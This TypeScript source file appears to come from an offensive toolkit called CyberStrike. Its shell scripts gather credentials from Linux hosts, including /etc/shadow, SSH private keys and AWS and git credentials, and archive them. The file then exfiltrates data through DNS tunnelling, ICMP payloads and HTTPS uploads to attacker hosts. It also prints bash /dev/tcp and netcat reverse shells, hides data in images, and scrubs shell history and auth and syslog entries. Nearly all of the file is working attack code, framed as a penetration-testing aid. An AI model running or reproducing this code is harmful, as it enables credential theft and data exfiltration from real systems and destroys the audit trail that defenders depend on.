import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Data Staging for Exfiltration ==="]

  const outDir = argVal(args, "--output-dir") || "/dev/shm"
  const encPass = argVal(args, "--encrypt")

  const script = `
OUTDIR="${outDir}"
mkdir -p "$OUTDIR" 2>/dev/null

echo "--- Locating Sensitive Files ---"
TARGETS=""

# Shadow / passwd
if [ -r /etc/shadow ]; then
  echo "[+] /etc/shadow (readable)"
  TARGETS="$TARGETS /etc/shadow"
fi
TARGETS="$TARGETS /etc/passwd"

# SSH keys
for dir in /root /home/*; do
  if [ -d "$dir/.ssh" ]; then
    for f in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
      if [ -r "$f" ]; then
        echo "[+] $f"
        TARGETS="$TARGETS $f"
      fi
    done
    [ -r "$dir/.ssh/authorized_keys" ] && TARGETS="$TARGETS $dir/.ssh/authorized_keys"
  fi
done

# Config files with credentials
for f in /etc/NetworkManager/system-connections/*.nmconnection \\
         /etc/wpa_supplicant/*.conf \\
         /etc/mysql/debian.cnf \\
         /etc/redis/redis.conf; do
  if [ -r "$f" ] 2>/dev/null; then
    echo "[+] $f"
    TARGETS="$TARGETS $f"
  fi
done

# Cloud creds
for dir in /root /home/*; do
  [ -r "$dir/.aws/credentials" ] && TARGETS="$TARGETS $dir/.aws/credentials" && echo "[+] $dir/.aws/credentials"
  [ -r "$dir/.docker/config.json" ] && TARGETS="$TARGETS $dir/.docker/config.json" && echo "[+] $dir/.docker/config.json"
  [ -r "$dir/.git-credentials" ] && TARGETS="$TARGETS $dir/.git-credentials" && echo "[+] $dir/.git-credentials"
done

# History files
for dir in /root /home/*; do
  for h in .bash_history .zsh_history; do
    [ -r "$dir/$h" ] && TARGETS="$TARGETS $dir/$h" && echo "[+] $dir/$h"
  done
done

echo ""
ARCHIVE="$OUTDIR/cs_stage_$(date +%s).tar.gz"
if [ -n "$TARGETS" ]; then
  tar czf "$ARCHIVE" $TARGETS 2>/dev/null
  echo "[+] Staged archive: $ARCHIVE ($(du -h "$ARCHIVE" 2>/dev/null | cut -f1))"
  ${encPass ? `openssl enc -aes-256-cbc -salt -pbkdf2 -in "$ARCHIVE" -out "$ARCHIVE.enc" -pass pass:"${encPass}" 2>/dev/null && rm -f "$ARCHIVE" && echo "[+] Encrypted: $ARCHIVE.enc" || echo "[-] Encryption failed — unencrypted archive remains"` : `echo "[*] No encryption requested — use --encrypt <password> to encrypt"`}
else
  echo "[-] No readable sensitive files found"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const stagedFiles = (r.stdout.match(/\[\+\]/g) || []).length
  if (r.stdout.includes("Staged archive")) {
    findings.push({
      checkId: "LNX-STAGE-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "STAGED",
      resource: outDir,
      title: "Sensitive data staged for exfiltration",
      details: `${stagedFiles} sensitive file(s) staged to ${outDir}. ${encPass ? "Archive encrypted with AES-256-CBC." : "Archive is NOT encrypted."}`,
      remediation: "Ensure cleanup_linux is run before leaving. Remove staged archives immediately after exfiltration.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function dnsTunnelExfil(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== DNS Tunnel Exfiltration ==="]

  const dataFile = argVal(args, "--data-file")
  const domain = argVal(args, "--domain")

  if (!dataFile || !domain) {
    output.push("Usage: linuxhook dns_tunnel_exfil --data-file /path/to/file --domain attacker.com")
    output.push("Data is encoded as hex subdomains: <chunk>.attacker.com")
    return { output: output.join("\n"), findings }
  }

  const script = `
if [ ! -r "${dataFile}" ]; then
  echo "[-] Cannot read ${dataFile}"
  exit 1
fi

echo "[*] Encoding ${dataFile} for DNS exfiltration to ${domain}"
FILESIZE=$(wc -c < "${dataFile}" 2>/dev/null)
echo "[*] File size: $FILESIZE bytes"

# Split into 30-byte chunks (60 hex chars fits in DNS label)
CHUNKS=$(xxd -p "${dataFile}" 2>/dev/null | fold -w 60)
TOTAL=$(echo "$CHUNKS" | wc -l)
echo "[*] Total chunks: $TOTAL"

COUNT=0
if command -v dig >/dev/null 2>&1; then
  echo "[*] Using dig for DNS queries"
  echo "$CHUNKS" | while read -r chunk; do
    COUNT=$((COUNT+1))
    dig +short "$COUNT.$chunk.${domain}" A >/dev/null 2>&1
  done
elif command -v nslookup >/dev/null 2>&1; then
  echo "[*] Using nslookup for DNS queries"
  echo "$CHUNKS" | while read -r chunk; do
    COUNT=$((COUNT+1))
    nslookup "$COUNT.$chunk.${domain}" >/dev/null 2>&1
  done
elif command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3 for DNS queries"
  python3 -c "
import socket, sys
chunks = open('${dataFile}','rb').read().hex()
n = 60
parts = [chunks[i:i+n] for i in range(0,len(chunks),n)]
for i,p in enumerate(parts):
    try: socket.getaddrinfo(f'{i}.{p}.${domain}', None)
    except: pass
print(f'Sent {len(parts)} chunks')
" 2>/dev/null
else
  echo "[-] No DNS query tool available (dig, nslookup, or python3 required)"
  exit 1
fi

echo "[+] DNS exfiltration complete — $TOTAL chunks sent to ${domain}"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("exfiltration complete")) {
    const chunks = r.stdout.match(/Total chunks: (\d+)/)?.[1] || "unknown"
    findings.push({
      checkId: "LNX-DNSTUN-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXFILTRATED",
      resource: dataFile,
      title: "Data exfiltrated via DNS tunneling",
      details: `${chunks} DNS chunks sent to ${domain}. Data encoded as hex subdomains in A record queries.`,
      remediation: "Monitor DNS query logs for unusual subdomain patterns. Implement DNS query length limits.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function icmpExfil(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ICMP Exfiltration ==="]

  const dataFile = argVal(args, "--data-file")
  const target = argVal(args, "--target")

  if (!dataFile || !target) {
    output.push("Usage: linuxhook icmp_exfil --data-file /path/to/file --target <attacker-ip>")
    output.push("Data is hidden in ICMP echo request payloads")
    return { output: output.join("\n"), findings }
  }

  const script = `
if [ ! -r "${dataFile}" ]; then
  echo "[-] Cannot read ${dataFile}"
  exit 1
fi

FILESIZE=$(wc -c < "${dataFile}" 2>/dev/null)
echo "[*] File: ${dataFile} ($FILESIZE bytes)"
echo "[*] Target: ${target}"

if command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3 raw socket ICMP exfil"
  python3 -c "
import socket, struct

def checksum(data):
    s = 0
    for i in range(0, len(data)-1, 2):
        s += (data[i] << 8) + data[i+1]
    if len(data) % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xffff)
    return ~(s + (s >> 16)) & 0xffff

with open('${dataFile}', 'rb') as f:
    data = f.read()

chunk_size = 48
chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
print(f'[*] Sending {len(chunks)} ICMP packets to ${target}')

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    for i, chunk in enumerate(chunks):
        header = struct.pack('!BBHHH', 8, 0, 0, i & 0xffff, 0)
        cs = checksum(header + chunk)
        header = struct.pack('!BBHHH', 8, 0, cs, i & 0xffff, 0)
        sock.sendto(header + chunk, ('${target}', 0))
    sock.close()
    print(f'[+] Sent {len(chunks)} ICMP packets')
except PermissionError:
    print('[-] Raw socket requires root')
except Exception as e:
    print(f'[-] Error: {e}')
" 2>/dev/null
else
  echo "[*] Using ping -p (limited to 16 hex bytes per packet)"
  CHUNKS=$(xxd -p "${dataFile}" 2>/dev/null | fold -w 32)
  TOTAL=$(echo "$CHUNKS" | wc -l)
  COUNT=0
  echo "$CHUNKS" | while read -r chunk; do
    COUNT=$((COUNT+1))
    padded=$(printf '%-32s' "$chunk" | tr ' ' '0')
    ping -c 1 -p "$padded" -s 32 "${target}" >/dev/null 2>&1
  done
  echo "[+] Sent $TOTAL ping packets with embedded data"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Sent")) {
    findings.push({
      checkId: "LNX-ICMPEX-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXFILTRATED",
      resource: dataFile,
      title: "Data exfiltrated via ICMP",
      details: `Data from ${dataFile} sent to ${target} embedded in ICMP echo request payloads`,
      remediation: "Monitor ICMP traffic for unusual payload sizes. Block unnecessary outbound ICMP at the firewall.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function covertChannel(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Covert Channel Setup ==="]

  const chanType = argVal(args, "--type") || "tcp"
  const target = argVal(args, "--target") || "127.0.0.1"
  const port = argVal(args, "--port") || "4444"

  const script = `
echo "[*] Covert channel type: ${chanType}"

case "${chanType}" in
  tcp)
    echo "--- Bash /dev/tcp Reverse Shell ---"
    echo "[*] Listener command (on attacker): nc -lvnp ${port}"
    echo "[*] Connect command:"
    echo "    bash -i >& /dev/tcp/${target}/${port} 0>&1"
    echo ""
    echo "--- Alternative: exec redirect ---"
    echo "    exec 5<>/dev/tcp/${target}/${port}; cat <&5 | bash 2>&5 >&5"
    echo ""
    echo "--- Checking /dev/tcp availability ---"
    if bash -c "echo test > /dev/tcp/127.0.0.1/1 2>/dev/null"; then
      echo "[+] /dev/tcp is available"
    else
      echo "[*] /dev/tcp may work (test against actual listener)"
    fi
    ;;
  unix)
    echo "--- Unix Domain Socket Channel ---"
    SOCK="/dev/shm/.cs_sock_$$"
    echo "[*] Socket path: $SOCK"
    echo "[*] Listener: socat UNIX-LISTEN:$SOCK,fork EXEC:/bin/bash"
    echo "[*] Connect:  socat - UNIX-CONNECT:$SOCK"
    if command -v socat >/dev/null 2>&1; then
      echo "[+] socat is available"
    elif command -v nc >/dev/null 2>&1; then
      echo "[*] Using netcat with Unix socket: nc -lU $SOCK"
    else
      echo "[-] Neither socat nor nc found"
    fi
    ;;
  shm)
    echo "--- Shared Memory IPC Channel ---"
    SHM_IN="/dev/shm/.cs_in_$$"
    SHM_OUT="/dev/shm/.cs_out_$$"
    echo "[*] Input:  $SHM_IN"
    echo "[*] Output: $SHM_OUT"
    echo "[*] Writer: while true; do cat $SHM_IN | bash > $SHM_OUT 2>&1; done"
    echo "[*] Reader: echo 'id' > $SHM_IN; cat $SHM_OUT"
    echo "[+] /dev/shm is always available on Linux (tmpfs)"
    ;;
  pipe)
    echo "--- Named Pipe (FIFO) Channel ---"
    PIPE="/dev/shm/.cs_pipe_$$"
    echo "[*] Pipe: $PIPE"
    echo "[*] Create: mkfifo $PIPE"
    echo "[*] Shell:  bash -i < $PIPE 2>&1 | nc -l ${port} > $PIPE"
    echo "[*] Or:     cat $PIPE | bash 2>&1 | nc ${target} ${port} > $PIPE"
    echo "[+] mkfifo available: $(command -v mkfifo >/dev/null 2>&1 && echo yes || echo no)"
    ;;
  *)
    echo "[-] Unknown channel type: ${chanType}"
    echo "[*] Available: tcp, unix, shm, pipe"
    ;;
esac
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-COVERT-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: "READY",
    resource: chanType,
    title: `Covert ${chanType} channel prepared`,
    details: `${chanType} covert channel instructions generated for ${target}:${port}`,
    remediation: "Monitor for unusual Unix sockets, named pipes, and /dev/shm files. Restrict outbound connections.",
  })

  return { output: output.join("\n"), findings }
}

export async function httpsExfil(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== HTTPS Exfiltration ==="]

  const url = argVal(args, "--url")
  const dataFile = argVal(args, "--data-file")
  const method = argVal(args, "--method") || "POST"

  if (!url || !dataFile) {
    output.push(
      "Usage: linuxhook https_exfil --url https://attacker.com/upload --data-file /path/to/file [--method POST|PUT]",
    )
    return { output: output.join("\n"), findings }
  }

  const script = `
if [ ! -r "${dataFile}" ]; then
  echo "[-] Cannot read ${dataFile}"
  exit 1
fi

FILESIZE=$(wc -c < "${dataFile}" 2>/dev/null)
echo "[*] File: ${dataFile} ($FILESIZE bytes)"
echo "[*] Target: ${url}"
echo "[*] Method: ${method}"

B64DATA=$(base64 "${dataFile}" 2>/dev/null | tr -d '\\n')

if command -v curl >/dev/null 2>&1; then
  echo "[*] Using curl"
  curl -sk -X ${method} -H "Content-Type: application/octet-stream" -d "$B64DATA" "${url}" 2>&1
  STATUS=$?
  [ $STATUS -eq 0 ] && echo "[+] Exfiltration via curl succeeded" || echo "[-] curl failed (exit $STATUS)"
elif command -v wget >/dev/null 2>&1; then
  echo "[*] Using wget"
  wget -q --method=${method} --header="Content-Type: application/octet-stream" --body-data="$B64DATA" "${url}" -O - 2>&1
  STATUS=$?
  [ $STATUS -eq 0 ] && echo "[+] Exfiltration via wget succeeded" || echo "[-] wget failed (exit $STATUS)"
elif command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3"
  python3 -c "
import urllib.request, base64, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
data = base64.b64encode(open('${dataFile}','rb').read())
req = urllib.request.Request('${url}', data=data, method='${method}')
req.add_header('Content-Type', 'application/octet-stream')
resp = urllib.request.urlopen(req, context=ctx)
print(f'[+] HTTP {resp.status} — exfiltration succeeded')
" 2>/dev/null
else
  echo "[-] No HTTP client available (curl, wget, or python3 required)"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("succeeded")) {
    findings.push({
      checkId: "LNX-HTTPEX-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXFILTRATED",
      resource: dataFile,
      title: "Data exfiltrated via HTTPS",
      details: `${dataFile} exfiltrated to ${url} via ${method} request (base64 encoded)`,
      remediation: "Monitor outbound HTTPS POST/PUT requests for large payloads. Implement egress filtering and DLP.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function cleanupLinux(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== CyberStrike Linux Cleanup ==="]
  const dryRun = hasFlag(args, "--dry-run")

  const script = `
DRY=${dryRun ? "1" : "0"}
CLEANED=0

echo "[*] Mode: ${dryRun ? "DRY RUN (no changes)" : "LIVE — removing artifacts"}"
echo ""

echo "--- Temporary Files ---"
for pattern in /dev/shm/cs_* /dev/shm/.cs_* /tmp/cs_* /tmp/.cs_*; do
  for f in $pattern; do
    if [ -e "$f" ]; then
      echo "[+] Found: $f"
      [ "$DRY" = "0" ] && rm -rf "$f" && echo "    Removed" && CLEANED=$((CLEANED+1))
    fi
  done
done

echo ""
echo "--- Cron Entries ---"
if crontab -l 2>/dev/null | grep -q "cs_\\|cyberstrike"; then
  echo "[+] Found CyberStrike cron entries"
  crontab -l 2>/dev/null | grep "cs_\\|cyberstrike"
  if [ "$DRY" = "0" ]; then
    crontab -l 2>/dev/null | grep -v "cs_\\|cyberstrike" | crontab - 2>/dev/null
    echo "    Cleaned crontab"
    CLEANED=$((CLEANED+1))
  fi
fi
for f in /etc/cron.d/cs_*; do
  if [ -e "$f" ]; then
    echo "[+] Found: $f"
    [ "$DRY" = "0" ] && rm -f "$f" && echo "    Removed" && CLEANED=$((CLEANED+1))
  fi
done

echo ""
echo "--- Systemd Units ---"
for f in /etc/systemd/system/cs_* /etc/systemd/system/.cs_* ~/.config/systemd/user/cs_*; do
  if [ -e "$f" ] 2>/dev/null; then
    echo "[+] Found: $f"
    if [ "$DRY" = "0" ]; then
      systemctl stop "$(basename "$f")" 2>/dev/null
      systemctl disable "$(basename "$f")" 2>/dev/null
      rm -f "$f"
      echo "    Stopped and removed"
      CLEANED=$((CLEANED+1))
    fi
  fi
done

echo ""
echo "--- SSH Authorized Keys (added entries) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    if grep -q "cyberstrike\\|cs_implant" "$dir/.ssh/authorized_keys" 2>/dev/null; then
      echo "[+] Found CyberStrike key in $dir/.ssh/authorized_keys"
      if [ "$DRY" = "0" ]; then
        grep -v "cyberstrike\\|cs_implant" "$dir/.ssh/authorized_keys" > "$dir/.ssh/authorized_keys.tmp"
        mv "$dir/.ssh/authorized_keys.tmp" "$dir/.ssh/authorized_keys"
        echo "    Cleaned"
        CLEANED=$((CLEANED+1))
      fi
    fi
  fi
done

echo ""
echo "--- Shell RC Injections ---"
for dir in /root /home/*; do
  for rc in .bashrc .bash_profile .profile .zshrc; do
    if [ -f "$dir/$rc" ] && grep -q "cs_\\|cyberstrike" "$dir/$rc" 2>/dev/null; then
      echo "[+] Found injection in $dir/$rc"
      if [ "$DRY" = "0" ]; then
        grep -v "cs_\\|cyberstrike" "$dir/$rc" > "$dir/$rc.tmp"
        mv "$dir/$rc.tmp" "$dir/$rc"
        echo "    Cleaned"
        CLEANED=$((CLEANED+1))
      fi
    fi
  done
done

echo ""
echo "--- Udev Rules ---"
for f in /etc/udev/rules.d/cs_* /etc/udev/rules.d/*cyberstrike*; do
  if [ -e "$f" ] 2>/dev/null; then
    echo "[+] Found: $f"
    [ "$DRY" = "0" ] && rm -f "$f" && echo "    Removed" && CLEANED=$((CLEANED+1))
  fi
done

echo ""
echo "--- APT Hooks ---"
for f in /etc/apt/apt.conf.d/cs_* /etc/apt/apt.conf.d/*cyberstrike*; do
  if [ -e "$f" ] 2>/dev/null; then
    echo "[+] Found: $f"
    [ "$DRY" = "0" ] && rm -f "$f" && echo "    Removed" && CLEANED=$((CLEANED+1))
  fi
done

echo ""
echo "--- PAM Modules ---"
for f in /lib/security/cs_* /lib/x86_64-linux-gnu/security/cs_*; do
  if [ -e "$f" ] 2>/dev/null; then
    echo "[+] Found: $f"
    [ "$DRY" = "0" ] && rm -f "$f" && echo "    Removed" && CLEANED=$((CLEANED+1))
  fi
done

echo ""
echo "--- History Cleanup ---"
if [ "$DRY" = "0" ]; then
  history -c 2>/dev/null
  for dir in /root /home/*; do
    for h in .bash_history .zsh_history; do
      if [ -f "$dir/$h" ]; then
        grep -v "linuxhook\\|cyberstrike\\|cs_" "$dir/$h" > "$dir/$h.tmp" 2>/dev/null
        mv "$dir/$h.tmp" "$dir/$h" 2>/dev/null
      fi
    done
  done
  echo "[+] Shell history cleaned"
  CLEANED=$((CLEANED+1))
else
  echo "[*] Would clean shell history (dry run)"
fi

echo ""
echo "--- Log Cleanup ---"
if [ "$DRY" = "0" ]; then
  for log in /var/log/auth.log /var/log/secure /var/log/syslog; do
    if [ -f "$log" ] && [ -w "$log" ]; then
      grep -v "linuxhook\\|cyberstrike\\|cs_" "$log" > "$log.tmp" 2>/dev/null
      mv "$log.tmp" "$log" 2>/dev/null
      echo "[+] Cleaned $log"
      CLEANED=$((CLEANED+1))
    fi
  done
else
  echo "[*] Would clean log files (dry run)"
fi

echo ""
echo "=== Cleanup Summary ==="
echo "Artifacts cleaned: $CLEANED"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const cleanedMatch = r.stdout.match(/Artifacts cleaned: (\d+)/)
  const cleaned = cleanedMatch ? parseInt(cleanedMatch[1]) : 0

  findings.push({
    checkId: "LNX-CLEANUP-001",
    provider: "linuxhook",
    severity: "INFO",
    status: dryRun ? "DRY_RUN" : "CLEANED",
    resource: "system",
    title: dryRun ? "Cleanup dry run completed" : "CyberStrike artifacts cleaned",
    details: dryRun
      ? "Dry run — no changes made. Review output for artifacts that would be removed."
      : `${cleaned} artifact(s) removed from target system`,
    remediation: "Always run cleanup before exiting a target. Use --dry-run first to review.",
  })

  return { output: output.join("\n"), findings }
}

export async function artifactEnum(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== CyberStrike Artifact Enumeration ==="]

  const script = `
echo "[*] Scanning for CyberStrike artifacts on this system..."
echo ""
TOTAL=0

echo "--- Temp Files ---"
for pattern in /dev/shm/cs_* /dev/shm/.cs_* /tmp/cs_* /tmp/.cs_*; do
  for f in $pattern; do
    [ -e "$f" ] && echo "[!] $f" && TOTAL=$((TOTAL+1))
  done
done

echo ""
echo "--- Cron ---"
crontab -l 2>/dev/null | grep -n "cs_\|cyberstrike" && TOTAL=$((TOTAL+1))
ls /etc/cron.d/cs_* /etc/cron.d/*cyberstrike* 2>/dev/null && TOTAL=$((TOTAL+1))

echo ""
echo "--- Systemd ---"
ls /etc/systemd/system/cs_* /etc/systemd/system/.cs_* 2>/dev/null && TOTAL=$((TOTAL+1))
ls ~/.config/systemd/user/cs_* 2>/dev/null && TOTAL=$((TOTAL+1))

echo ""
echo "--- SSH Keys ---"
for dir in /root /home/*; do
  grep -l "cyberstrike\|cs_implant" "$dir/.ssh/authorized_keys" 2>/dev/null && TOTAL=$((TOTAL+1))
done

echo ""
echo "--- Shell RC Files ---"
for dir in /root /home/*; do
  for rc in .bashrc .bash_profile .profile .zshrc; do
    grep -l "cs_\|cyberstrike" "$dir/$rc" 2>/dev/null && TOTAL=$((TOTAL+1))
  done
done

echo ""
echo "--- Udev / APT / PAM ---"
ls /etc/udev/rules.d/cs_* /etc/udev/rules.d/*cyberstrike* 2>/dev/null && TOTAL=$((TOTAL+1))
ls /etc/apt/apt.conf.d/cs_* /etc/apt/apt.conf.d/*cyberstrike* 2>/dev/null && TOTAL=$((TOTAL+1))
ls /lib/security/cs_* /lib/x86_64-linux-gnu/security/cs_* 2>/dev/null && TOTAL=$((TOTAL+1))

echo ""
echo "--- ld.so.preload ---"
grep -l "cs_\|cyberstrike" /etc/ld.so.preload 2>/dev/null && TOTAL=$((TOTAL+1))

echo ""
echo "--- Log Traces ---"
grep -cl "linuxhook\|cyberstrike\|cs_" /var/log/auth.log /var/log/secure /var/log/syslog 2>/dev/null && TOTAL=$((TOTAL+1))

echo ""
echo "=== Total artifacts found: $TOTAL ==="
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const totalMatch = r.stdout.match(/Total artifacts found: (\d+)/)
  const total = totalMatch ? parseInt(totalMatch[1]) : 0

  findings.push({
    checkId: "LNX-ARTIFACT-001",
    provider: "linuxhook",
    severity: total > 0 ? "MEDIUM" : "INFO",
    status: total > 0 ? "FOUND" : "CLEAN",
    resource: "system",
    title: total > 0 ? `${total} CyberStrike artifact(s) detected` : "No artifacts found",
    details:
      total > 0
        ? `${total} artifact(s) found on system — run cleanup_linux to remove`
        : "System appears clean of CyberStrike artifacts",
    remediation: "Run cleanup_linux (or cleanup_linux --dry-run first) to remove all artifacts before exiting.",
  })

  return { output: output.join("\n"), findings }
}

export async function steganographyExfil(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Steganography Exfiltration ==="]

  const coverImage = argVal(args, "--cover-image")
  const dataFile = argVal(args, "--data-file")

  if (!coverImage || !dataFile) {
    output.push("Usage: linuxhook steganography_exfil --cover-image /path/to/image.png --data-file /path/to/secret")
    output.push("Hides data inside an image file for covert exfiltration")
    return { output: output.join("\n"), findings }
  }

  const script = `
if [ ! -r "${coverImage}" ]; then
  echo "[-] Cannot read cover image: ${coverImage}"
  exit 1
fi
if [ ! -r "${dataFile}" ]; then
  echo "[-] Cannot read data file: ${dataFile}"
  exit 1
fi

IMGSIZE=$(wc -c < "${coverImage}" 2>/dev/null)
DATASIZE=$(wc -c < "${dataFile}" 2>/dev/null)
echo "[*] Cover image: ${coverImage} ($IMGSIZE bytes)"
echo "[*] Data file: ${dataFile} ($DATASIZE bytes)"

OUTFILE="${coverImage}_steg"

if command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3 append method"
  python3 -c "
import shutil
shutil.copy2('${coverImage}', '${dataFile}_steg')
with open('${dataFile}_steg', 'ab') as img:
    img.write(b'\\xff\\xfe')  # marker
    with open('${dataFile}', 'rb') as data:
        img.write(data.read())
    img.write(b'\\xfe\\xff')  # end marker
import os
os.rename('${dataFile}_steg', '$OUTFILE')
print(f'[+] Created: $OUTFILE ({os.path.getsize(\"$OUTFILE\")} bytes)')
" 2>/dev/null
else
  echo "[*] Using dd append method"
  cp "${coverImage}" "$OUTFILE" 2>/dev/null
  printf '\\xff\\xfe' >> "$OUTFILE"
  cat "${dataFile}" >> "$OUTFILE"
  printf '\\xfe\\xff' >> "$OUTFILE"
  OUTSIZE=$(wc -c < "$OUTFILE" 2>/dev/null)
  echo "[+] Created: $OUTFILE ($OUTSIZE bytes)"
fi

echo ""
echo "[*] To extract: look for \\xff\\xfe marker in the file and read until \\xfe\\xff"
echo "[*] The image still opens normally in viewers"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Created")) {
    findings.push({
      checkId: "LNX-STEGO-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "CREATED",
      resource: coverImage,
      title: "Steganographic file created",
      details: `Data from ${dataFile} hidden inside ${coverImage} — file appears normal to viewers`,
      remediation:
        "Monitor for file size anomalies. Use steganography detection tools. Check file signatures vs actual content.",
    })
  }

  return { output: output.join("\n"), findings }
}
